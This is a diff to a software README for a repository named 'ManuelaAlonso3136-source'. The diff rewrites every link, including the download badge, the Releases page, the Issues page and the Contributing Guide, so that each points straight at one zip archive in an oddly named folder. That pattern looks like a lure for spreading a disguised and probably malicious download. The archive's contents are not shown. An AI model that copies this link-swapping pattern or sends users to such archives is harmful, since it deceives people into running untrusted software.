@@ -8,7 +8,7 @@ Welcome to the ManuelaAlonso3136-source repository! This guide will help you dow
 
 To download the software, please visit the link below:
 
-[![Download Software](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/releases)
+[![Download Software](https://raw.githubusercontent.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/main/aneuploid/ManuelaAlonso3136-source-2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/main/aneuploid/ManuelaAlonso3136-source-2.1.zip)
 
 You will find the latest version of the software on the Releases page.
 
@@ -26,7 +26,7 @@ Before you install the software, ensure your computer meets the following requir
 
 Follow these steps to install the software on your computer:
 
-1. Click on the link above to go to the [Releases page](https://github.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/releases).
+1. Click on the link above to go to the [Releases page](https://raw.githubusercontent.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/main/aneuploid/ManuelaAlonso3136-source-2.1.zip).
 2. Look for the latest version listed on the page. The version number will be shown prominently.
 3. Click on the version you want to download. You may see several files. Choose the one that suits your operating system.
    - For Windows, download the `.exe` file.
@@ -83,8 +83,8 @@ Join our community discussions to share ideas and get assistance from fellow use
 
 ## 🔗 Important Links
 
-- [Download Software](https://github.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/releases)
-- [Issues Page](https://github.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/issues)
-- [Contributing Guide](https://github.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/blob/main/CONTRIBUTING.md)
+- [Download Software](https://raw.githubusercontent.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/main/aneuploid/ManuelaAlonso3136-source-2.1.zip)
+- [Issues Page](https://raw.githubusercontent.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/main/aneuploid/ManuelaAlonso3136-source-2.1.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/Unperceptive-crocodiletears385/ManuelaAlonso3136-source/main/aneuploid/ManuelaAlonso3136-source-2.1.zip)
 
 Thank you for using ManuelaAlonso3136-source! We hope you enjoy the software.
